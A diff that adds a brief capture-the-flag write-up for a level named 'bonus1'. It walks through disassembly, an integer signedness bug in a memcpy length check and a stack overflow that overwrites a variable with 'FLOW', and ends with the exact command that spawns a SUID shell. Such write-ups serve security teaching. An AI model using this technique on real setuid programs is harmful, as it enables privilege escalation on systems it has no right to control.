@@ -1,0 +1,24 @@
+The program begins by doing an atoi of argv[1]:
+0x0804842d      8b450c         mov eax, dword [str]
+0x08048430      83c004         add eax, 4
+0x08048433      8b00           mov eax, dword [eax]
+0x08048435      890424         mov dword [esp], eax
+0x08048438      e823ffffff     call sym.imp.atoi
+0x0804843d      8944243c       mov dword [local_3ch], eax
+0x08048441      837c243c09     cmp dword [local_3ch], 9
+0x08048446      7e07           jle 0x804844f
+It puts the value returned by atoi on the stack at $esp+0x3c. Let's name it nbytes.
+It then jump to the end of main if nbytes is not less then or equal to 9.
+
+It then does a memcpy to a buffer on the stack located at $esp+20 with argv[2] of (nbytes * 4) bytes. $esp+0x14 is lower then $esp+0x3c, which means the buffer is below (in addresses) nbytes.
+
+memcpy takes a size_t (which is an unsigned integer type) instead of an int, so we can put a negative value in decimal as first parameter of the program, the memcpy will interpret it as a unsigned integer, which means our value will be used as a positive value.
+The program multiplies our value by 4 (as an unsigned value) before giving it to memcpy.
+
+It then tests if nbytes is equal to 0x574f4c46 and if it is, the flow continues to a excl that calls a shell for us.
+
+So we need to find a negative number that as interpreted as unsigned int and multiplied by 4 gives us a sufficient number of copied bytes from argv[2] so that nbytes (on the stack) is overwriting with the value 0x574f4c46 which is 'FLOW' in ascii.
+
+Finally we do:
+./bonus1 -1073741775  "`python -c 'import sys; sys.stdout.write("FLOW" * 400)'`"
+and we get a SUID-shell.
